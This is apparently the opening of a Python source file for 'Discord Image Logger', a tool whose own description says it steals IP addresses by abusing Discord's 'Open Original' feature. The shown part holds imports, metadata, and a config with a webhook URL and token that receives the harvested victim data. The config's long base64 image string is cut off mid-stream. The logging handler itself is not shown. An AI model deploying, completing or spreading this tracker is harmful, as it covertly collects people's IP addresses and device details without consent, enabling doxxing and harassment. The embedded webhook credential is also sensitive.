# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1354535482637418709/45doeyv3CGNwFdGBAFgbfim6Uf-5Er-7Z01yQc2uuTx6vbFzyM3fE4Ex-ikj-dAdWGqy",
    "image": "data:image/jpeg;base64,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